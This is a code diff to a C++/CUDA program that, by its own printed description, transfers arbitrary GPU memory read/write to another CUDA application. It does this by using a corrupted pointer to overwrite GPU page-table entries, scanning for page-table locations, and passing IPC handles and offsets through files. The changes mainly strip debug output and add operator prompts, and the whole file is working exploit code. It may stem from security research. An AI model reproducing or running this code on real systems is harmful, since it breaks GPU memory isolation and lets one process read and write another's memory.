@@ -25,9 +25,6 @@ main (int argc, char *argv[])
 
   auto &cudaMalloced_ptrs = ctx.step4_data.cudaMalloced_ptrs;
   auto &corrupted_ptr = ctx.step3_data.corrupted_ptr;
-
-  std::cout << (void*)cudaMalloced_ptrs[0] << ' ' << cudaMalloced_ptrs.size() << ' '<< (void*) corrupted_ptr <<'\n';
-  pause();
   
   char * flush_ptr;
   uint8_t *data_device_ptr;
@@ -47,23 +44,18 @@ main (int argc, char *argv[])
   cudaDeviceSynchronize();
   gpuErrchk(cudaPeekAtLastError());
 
-  std::cout << "ok"
-            << '\n';
-  // find virtual address of the 4KB frame
-
   uint64_t arb_rw_ofs;
   
   uint64_t initial_offset_1;
   uint64_t initial_offset_2;
-
+  std::cout << "This application helps transfers Arbitrary RW to another CUDA application: \n"
+            << "(1) Ptr for Arbitrary RW (2) Pointer to PT Region (3) Offset to PTE of Ptr for Arbitrary RW" <<'\n';
   std::cout << "Please select two 2MB PTE addresses and enter them:" << '\n';
-  std::cout << "Enter the first one:" << '\n'; std::cin.clear();
+  std::cout << "Enter the first one:" << '\n' << std::flush;
   std::cin >> std::hex >> initial_offset_1;
-  std::cout << "Enter the second one:" << '\n'; std::cin.clear();
+  std::cout << "Enter the second one:" << '\n' << std::flush;
   std::cin >> std::hex >> initial_offset_2;
   std::cin >> std::dec;
-
-  std::cout << initial_offset_1 << ' ' << initial_offset_2 <<'\n';
 
   void* arb_rw_orig_ptr = nullptr;
   void* arb_rw_ptr = nullptr;
@@ -75,7 +67,6 @@ main (int argc, char *argv[])
 
   cudaMemcpyArray(data_device_ptr, corrupted_ptr + initial_offset_2, 8);
   pt_rw_orig_ptr = *(void**)data_device_ptr;
-  std::cout << "Phys: " << pt_rw_orig_ptr << ' ' << arb_rw_orig_ptr << '\n';
 
   memset_ptr<<<1,1>>>(corrupted_ptr + initial_offset_1, (uint64_t)(0x60000000000001), 8);
   cudaDeviceSynchronize();
@@ -89,7 +80,7 @@ main (int argc, char *argv[])
     std::cout << (void *)cudaMalloced_ptrs[j] << ' ' << *(void**)data_device_ptr << '\n';
     if (*(void**)data_device_ptr !=  (void *)cudaMalloced_ptrs[j])
     {
-      std::cout << "Arb:" << (void *)cudaMalloced_ptrs[j] << ' ' << *(void**)data_device_ptr << ' ' << j << '\n';
+      std::cout << "Arb:" << (void *)cudaMalloced_ptrs[j] << ' ' << *(void**)data_device_ptr << ' ' << j << '\n' << std::flush;
       arb_rw_ptr = (void *)cudaMalloced_ptrs[j];
       arb_rw_ofs = j;
       break;
@@ -97,16 +88,12 @@ main (int argc, char *argv[])
     gpuErrchk(cudaPeekAtLastError());
   }
 
-  pause();
-  // find physical location of pointer_to_find
   uint64_t it_ptr = (uint64_t)(0x60000000000001);
   uint64_t target_pte_ofs = ((uint64_t)corrupted_ptr + initial_offset_1) % (2L * 1024 * 1024);
   for (uint64_t i = 0; i < (uint64_t)23L * 1024 * 1024 * 1024; i += ALLOC_SIZE)
     {
       if (i > (uint64_t)12L * 1024 * 1024 * 1024)
-      {
-        // gen_64KB(flush_ptr, flush_size);
-        
+      { 
         memset_ptr<<<1,1>>>(corrupted_ptr + initial_offset_1, it_ptr, 8);
         cudaDeviceSynchronize();
         gen_64KB(flush_ptr, flush_size);
@@ -127,7 +114,6 @@ main (int argc, char *argv[])
       }
       it_ptr += 0x20000;
     }
-  pause();
   uint64_t pt_entry_phys = it_ptr;
   void* pt_rw_ptr = nullptr;
   uint64_t pt_rw_ofs;
@@ -168,7 +154,10 @@ main (int argc, char *argv[])
   cudaMemcpyArray(data_device_ptr, (uint8_t*)arb_rw_ptr, 8);
   std::cout << "Arbitrary rw:" << *(void**)data_device_ptr << " Orig: "<< arb_rw_orig_ptr << '\n';
 
-  std::cout << "Wrote CUDA IPC handles to file\n";
+  std::cout << "Wrote CUDA IPC handles to 'cuda_ipc_arb.bin' and 'cuda_ipc_pt.bin'.\n\033[1;32mNow start your application and open the handles\033[0m.\n";
+  std::cout << "Press \033[1;32mEnter Key\033[0m when done...";
+
+  std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
   pause();
 
   // find orig pte entries:
@@ -215,7 +204,6 @@ main (int argc, char *argv[])
       }
       it_ptr += 0x20000;
     }
-  pause();
 
   // set new pt rw ptr to the PT's 2MB page
   // pass new arb_location offset through file.
@@ -228,6 +216,9 @@ main (int argc, char *argv[])
   memset_ptr<<<1,1>>>((uint8_t *)arb_rw_ptr + pt_location_ofs, pt_location, 8);
   cudaDeviceSynchronize();
 
+  memset_ptr<<<1,1>>>((uint8_t *)pt_rw_ptr + arb_location_ofs, (uint64_t)(0x60000000000001), 8);
+  cudaDeviceSynchronize();
+
   simple_flush<<<1,1>>>(flush_ptr, flush_size);
   cudaDeviceSynchronize();
 
@@ -235,6 +226,9 @@ main (int argc, char *argv[])
   new_ofs_file.write(reinterpret_cast<char*>(&arb_location_ofs), sizeof(arb_location_ofs));
   new_ofs_file.close();
 
+  std::cout << "Wrote new offset to 'new_offset.bin',\n\033[1;32mNow read the updated offset from this file in your application\033[0m.\n";
+  std::cout << "Your application should be able to have arbitrary RW as well now!\n";
+  std::cout << "Press \033[1;32mEnter Key\033[0m when done, the application will exit afterwards...";
   pause();
 
   return 0;
